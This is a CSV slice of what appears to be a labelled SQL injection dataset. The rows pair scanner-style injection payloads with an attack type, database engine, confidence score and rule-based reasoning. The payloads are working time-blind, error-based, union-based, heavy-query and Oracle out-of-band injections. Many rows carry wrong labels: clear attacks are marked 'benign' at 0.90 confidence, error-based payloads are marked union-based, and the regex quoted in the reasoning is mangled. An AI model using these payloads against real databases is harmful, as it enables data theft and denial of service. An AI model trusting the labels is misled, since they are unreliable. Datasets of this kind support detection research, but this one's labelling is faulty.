id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24680,end and ( ( ( 'ycte' = 'ycte,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24681,"1"" ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ""cyyh"" = ""cyyh",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24682,"select sleep ( 5 ) and ( ( ( ""uvzc"" like ""uvzc",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24683,-8010' or ( 2225 = 8491 ) *8491 and 'eipf' = 'eipf,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24684,"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ""icow"" like ""icow",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24685,select ( case when ( 5847 = 2826 ) then 5847 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24686,"1' ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'ibav' = 'ibav",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24687,"1' or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24688,"-9758'+ ( select 'rlcy' where 3691 = 3691 union all select 3691,3691,3691,3691,3691,3691,3691--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24689,"-4473' ) union all select 7656,7656#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24690,-8922 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) -- krmh,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24691,"1' ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'amjh' = 'amjh",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24692,"1' ) where 6774 = 6774 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24693,"1"" ) where 6255 = 6255 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24694,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 'xcxr' like 'xcxr",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
24695,"1'+ ( select 'yfrs' where 4388 = 4388 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24696,-9522 ) as lraw where 9472 = 9472 or ( 4087 = 8213 ) *8213--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24697,"1%"" or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24698,"1"" ) where 5828 = 5828 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24699,select sleep ( 5 ) and 'hhrw' like 'hhrw,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24700,1 ) ) as nwyh where 7100 = 7100,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24701,"-1339 ) ) ) union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24702,1'+ ( select 'dhcv' where 9372 = 9372,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24703,-8453 ) ) ) or 3038 = 3038,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24704,1' ) where 8274 = 8274,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24705,"1"" ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ""rwlq"" = ""rwlq",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24706,"1"" ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ""tvla"" = ""tvla",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24707,"-3116 ) ) as jyiq where 3875 = 3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24708,"1' where 4701 = 4701 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24709,"1"" ) ) as etap where 8506 = 8506 union all select null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24710,"1 ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( 3872 = 3872",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24711,"1"" ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""hbfr"" like ""hbfr",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24712,"1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'wwwb' = 'wwwb",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24713,"1' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'maln' like 'maln",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24714,"1%"" ) and elt ( 4249 = 4249,7259 ) and ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24715,1 ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 6518 = 6518,out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
24716,"1"" ) where 1705 = 1705",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24717,1' in boolean mode ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24718,"1"" ) ) as dvpb where 6673 = 6673",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24719,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) # idxq",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
24720,1 ) union all select null#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24721,"1%"" ) and sleep ( 5 ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24722,"1"" where 5977 = 5977",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24723,"-4340 ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 8505 = 8505",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24724,1'+ ( select 'drqj' where 1246 = 1246,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24725,1%' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24726,"1"" ) ) as uqem where 3521 = 3521",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24727,"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'pjrf' = 'pjrf",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24728,1' ) and 5999 = 5879,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24729,"-9601' ) ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24730,-2793' ) where 2621 = 2621 union all select 2621#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24731,1 union all select null#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24732,select case when 1802 = 7063 then 1 else null end--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24733,"-6680%"" ) ) union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24734,"1 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) -- fzhj",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24735,1'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24736,"-5624' union all select 3723,3723,3723,3723,3723--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24737,"-9371' ) union all select 5900,5900,5900#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24738,"1"" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ""krtr"" like ""krtr",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24739,"1%' ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24740,1' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 'ugrk' = 'ugrk,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
24741,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'nhuk' = 'nhuk",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24742,"1, ( select ( case when ( 5885 = 1825 ) then 1 else 5885* ( select 5885 from master..sysdatabases ) end ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24743,"1 ) as lhie where 4631 = 4631 union all select null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
